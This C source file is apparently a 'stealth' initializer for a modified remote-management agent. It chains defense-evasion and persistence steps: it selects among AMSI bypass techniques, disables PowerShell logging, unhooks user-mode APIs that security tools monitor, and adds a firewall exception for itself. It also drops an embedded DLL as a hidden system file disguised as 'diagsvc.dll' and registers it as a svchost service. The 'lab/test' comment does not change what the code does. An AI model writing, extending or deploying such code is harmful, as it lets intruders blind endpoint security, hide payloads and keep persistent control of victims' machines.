// Lab/test stealth initializer
#include <windows.h>
#include <wchar.h>
#include <tchar.h>
#include "stealth.h"
#include "stealth_utils.h"
#include "../meshcore/generated/meshagent_branding.h"

static int EnvEnabledW(const wchar_t* name, int defaultOn)
{
    wchar_t buf[16] = {0};
    DWORD n = GetEnvironmentVariableW(name, buf, (DWORD)(sizeof(buf)/sizeof(buf[0])));
    if (n == 0 || n >= (DWORD)(sizeof(buf)/sizeof(buf[0]))) { return defaultOn; }
    for (DWORD i = 0; i < n; ++i) { wchar_t c = buf[i]; if (c >= L'A' && c <= L'Z') buf[i] = (wchar_t)(c - L'A' + L'a'); }
    return (wcsncmp(buf, L"1", 1) == 0) || (wcscmp(buf, L"true") == 0) || (wcscmp(buf, L"yes") == 0) || (wcscmp(buf, L"on") == 0);
}

static void GetModulePathW(wchar_t* out, DWORD cch)
{
    if (!out || cch == 0) return;
    DWORD n = GetModuleFileNameW(NULL, out, cch);
    if (n >= cch) { out[cch-1] = L'\0'; }
}

void Stealth_InitLabFeatures(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    // Default enable in StealthLab configs; otherwise require STEALTH_LAB=1
#ifdef MESHAGENT_STEALTHLAB_DEFAULT
    const int defaultLab = 1;
#else
    const int defaultLab = 0;
#endif
    if (!EnvEnabledW(L"STEALTH_LAB", defaultLab)) { return; }

    // 1) AMSI bypass selection: STEALTH_AMSI = patch|hwbp|ntcontinue|none (default: patch)
    wchar_t amsiMode[16] = {0};
    DWORD amsiLen = GetEnvironmentVariableW(L"STEALTH_AMSI", amsiMode, (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0])));
    if (amsiLen == 0 || amsiLen >= (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0]))) {
        // default
        if (!Stealth_PatchAMSI())
        {
            Stealth_DebugPrintfA("Stealth_PatchAMSI default path failed");
        }
    } else {
        for (DWORD i = 0; i < amsiLen; ++i) { wchar_t c = amsiMode[i]; if (c >= L'A' && c <= L'Z') amsiMode[i] = (wchar_t)(c - L'A' + L'a'); }
        if (wcscmp(amsiMode, L"hwbp") == 0) {
            if (!Stealth_PatchAMSI_HardwareBreakpoint())
            {
                Stealth_DebugPrintfA("STEALTH_AMSI=hwbp failed to arm hardware breakpoint");
            }
        } else if (wcscmp(amsiMode, L"ntcontinue") == 0) {
            if (!Stealth_PatchAMSI_NtContinue())
            {
                Stealth_DebugPrintfA("STEALTH_AMSI=ntcontinue failed to activate bypass");
            }
        } else if (wcscmp(amsiMode, L"none") == 0) {
            // do nothing
        } else {
            if (!Stealth_PatchAMSI())
            {
                Stealth_DebugPrintfA("Stealth_PatchAMSI fallback failed");
            }
        }
    }

    // 2) Disable PowerShell logging (default on in lab)
    if (EnvEnabledW(L"STEALTH_DISABLE_POWERSHELL_LOG", 1)) {
        if (!Stealth_DisablePowerShellLogging())
        {
            Stealth_DebugPrintfA("Stealth_DisablePowerShellLogging failed");
        }
    }

    // 3) Unhook common user-mode APIs (default on in lab)
    if (EnvEnabledW(L"STEALTH_API_UNHOOK", 1)) {
        if (!Stealth_UnhookUserModeAPIs())
        {
            Stealth_DebugPrintfA("Stealth_UnhookUserModeAPIs failed");
        }
    }

    // 4) Add firewall rule for current service binary (default on in lab)
    if (EnvEnabledW(L"STEALTH_FIREWALL", 1)) {
        wchar_t exePath[MAX_PATH] = {0};
        GetModulePathW(exePath, MAX_PATH);
#ifdef UNICODE
        const wchar_t* svcNameW = MESH_AGENT_SERVICE_NAME;
#else
        wchar_t svcNameW[256] = {0};
        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_NAME, -1, svcNameW, (int)(sizeof(svcNameW)/sizeof(svcNameW[0])));
#endif
        if (!Stealth_AddFirewallRuleForService(svcNameW, exePath))
        {
            Stealth_DebugPrintfA("Stealth_AddFirewallRuleForService failed for %ws", svcNameW);
        }
    }

    int extractDefault = 0;
#if defined(MESH_AGENT_BUNDLE_EXTRACT_DEFAULT)
    extractDefault = (MESH_AGENT_BUNDLE_EXTRACT_DEFAULT != 0);
#elif defined(MESH_AGENT_SVCHOST_MODE) && MESH_AGENT_SVCHOST_MODE
    extractDefault = 1;
#endif

    // 5) Optionally extract bundled svchost DLL payload (if present in resources)
    if (EnvEnabledW(L"STEALTH_BUNDLE_EXTRACT", extractDefault)) {
        HMODULE hMod = GetModuleHandleW(NULL);
        HRSRC hRes = FindResourceW(hMod, L"SVCHOSTDLL", MAKEINTRESOURCEW(RT_RCDATA));
        if (hRes) {
            HGLOBAL hData = LoadResource(hMod, hRes);
            if (hData) {
                DWORD sz = SizeofResource(hMod, hRes);
                void* p = LockResource(hData);
                if (p && sz > 0) {
                    wchar_t dllOut[MAX_PATH] = {0};
                    BOOL useInstallPath = FALSE;
                    StealthInstallPaths paths;
                    if (Stealth_GetInstallPaths(&paths)) {
                        if (paths.installDir[0] != L'\0') {
                            Stealth_CreateInstallationDirectory(paths.installDir);
                        }
                        if (paths.dllPath[0] != L'\0') {
                            wcsncpy_s(dllOut, MAX_PATH, paths.dllPath, _TRUNCATE);
                            useInstallPath = (dllOut[0] != L'\0');
                        }
                    }

                    if (!useInstallPath) {
                        // Fallback: drop next to executable
                        GetModulePathW(dllOut, MAX_PATH);
                        size_t n = wcslen(dllOut);
                        while (n > 0 && dllOut[n-1] != L'\\' && dllOut[n-1] != L'/') { dllOut[--n] = L'\0'; }
                        wcscat_s(dllOut, MAX_PATH, L"diagsvc.dll");
                    }

                    HANDLE hf = CreateFileW(dllOut, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                    if (hf != INVALID_HANDLE_VALUE) {
                        DWORD written = 0;
                        BOOL wrote = WriteFile(hf, p, sz, &written, NULL);
                        DWORD writeErr = wrote ? ERROR_SUCCESS : GetLastError();
                        CloseHandle(hf);
                        if (wrote) {
                            SetFileAttributesW(dllOut, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
#ifdef UNICODE
                            const wchar_t* svcNameRef = MESH_AGENT_SERVICE_FILE;
                            WCHAR svcNameW[256] = {0};
                            if (svcNameRef != NULL) {
                                lstrcpynW(svcNameW, svcNameRef, (int)_countof(svcNameW));
                            }
#else
                            WCHAR svcNameW[256] = {0};
                            if (MESH_AGENT_SERVICE_FILE != NULL) {
                                MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, svcNameW, (int)_countof(svcNameW));
                            }
#endif
                            if (svcNameW[0] != L'\0') {
                                if (!Stealth_RegisterSvchostService(svcNameW, dllOut)) {
                                    Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", svcNameW);
                                }
                            }
                        }
                        else {
                            SetLastError(writeErr);
                            Stealth_DebugLastErrorW(L"WriteFile (svchost payload extract)");
                        }
                    }
                    else {
                        Stealth_DebugLastErrorW(L"CreateFileW (svchost payload extract)");
                    }
                }
            }
        }
    }
#else
    (void)0; // not enabled in this build
#endif
}
